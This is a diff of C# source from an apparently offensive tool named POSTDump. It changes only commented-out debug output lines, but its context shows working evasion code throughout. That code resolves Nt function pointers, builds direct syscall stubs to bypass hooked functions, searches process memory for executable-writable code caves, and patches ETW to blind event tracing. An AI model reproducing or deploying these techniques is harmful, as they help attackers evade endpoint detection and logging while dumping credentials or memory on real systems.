@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Text;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
@@ -78,7 +77,7 @@ namespace POSTDump
                     NtTable.Add(funcptr.ToInt64(), m);
                 }
             }
-            //Console.WriteLine(string.Join("\n", NtTable.Values));
+            ////MessageBox.Show(string.Join("\n", NtTable.Values));
             return NtTable;
         }
 
@@ -114,10 +113,10 @@ namespace POSTDump
             return funcptr;
         }
 
-        //Build syscall and return pointer
+
+        //Build syscall and return pointer only if function is hooked (avoid unstability using uncommon syscall where stub can be different)
         public IntPtr GetSyscallPtr(string func)
         {
-            //Console.WriteLine(func + "hooked, using syscall.");
             byte[] bytes = GetSyscallFromNeighbour(func);
             byte[] stack = bytes.Take(8).ToArray();
 
@@ -134,7 +133,6 @@ namespace POSTDump
                 }
             }
 
-                
             return stub;
         }
 
@@ -177,7 +175,8 @@ namespace POSTDump
                 }
 
                 ++i;
-                funcptr = new IntPtr(funcptr.ToInt64() + 1);
+                funcptr = new IntPtr(funcptr.ToInt64() + 1); //CLR2 
+                //funcptr = IntPtr.Add(funcptr, 1);
             }
 
             int bsize = b.Count;
@@ -313,7 +312,7 @@ namespace POSTDump
         //https://github.com/SECFORCE/SharpWhispers/blob/main/out/sharpASM.cs
         private static IntPtr GetZeroSequence(IntPtr addr, IntPtr regionLength, uint patternLength)
         {
-            //Console.WriteLine("[i] Searching sequence of " + patternLength + " NULL bytes to host the stub...");
+            ////MessageBox.Show("[i] Searching sequence of " + patternLength + " NULL bytes to host the stub...");
 
             // We will start searching from the end
             Int64 end = (Int64)regionLength - 1; // past here no match is possible
@@ -404,13 +403,13 @@ namespace POSTDump
                 // if this memory chunk is accessible and RWX
                 if (mem_basic_info.State == Data.StateEnum.MEM_COMMIT && mem_basic_info.Protect == Data.AllocationProtectEnum.PAGE_EXECUTE_READWRITE)
                 {
-                    //Console.WriteLine("[i] Found RWX Region: " + proc_min_address.ToString("X"));
+                    ////MessageBox.Show("[i] Found RWX Region: " + proc_min_address.ToString("X"));
                     if (returnL >= len)
                     {
                         //if (codecave.Contains((long)proc_min_address))
                         if (lastcodecave == (long)proc_min_address)
                         {
-                            //Console.WriteLine("Memory area used for the previous code cave.. Skipping");
+                            ////MessageBox.Show("Memory area used for the previous code cave.. Skipping");
                             proc_min_address_l += (long)mem_basic_info.RegionSize;
                             proc_min_address = new IntPtr(proc_min_address_l);
                             continue;
@@ -427,7 +426,7 @@ namespace POSTDump
                             IntPtr failed = new IntPtr(-1);
                             if (caveAddr != IntPtr.Zero && caveAddr != failed)
                             {
-                                //Console.WriteLine("[>] Sequence of 0s Found : " + string.Format("{0:X}", caveAddr.ToInt64()));
+                                ////MessageBox.Show("[>] Sequence of 0s Found : " + string.Format("{0:X}", caveAddr.ToInt64()));
                                 return caveAddr;
                             }
                         }
@@ -440,7 +439,7 @@ namespace POSTDump
             }
 
             // If no codecave found:
-            //Console.WriteLine("Not Found!");
+            ////MessageBox.Show("Not Found!");
 
             return IntPtr.Zero;
         }
@@ -457,7 +456,7 @@ namespace POSTDump
             //NTPVM(new IntPtr(-1), ref funcptr, ref RegionSize, 0x40, out uint old);
             NTPVM((IntPtr)(-1), ref funcptr, ref RegionSize, 0x04, out uint old);
             Marshal.Copy(patch, 0, oldaddress, patch.Length);
-            ////Console.WriteLine("ETW patched.\n");
+            ////MessageBox.Show("ETW patched.\n");
 
             NTPVM((IntPtr)(-1), ref funcptr, ref RegionSize, old, out uint _);
             return;
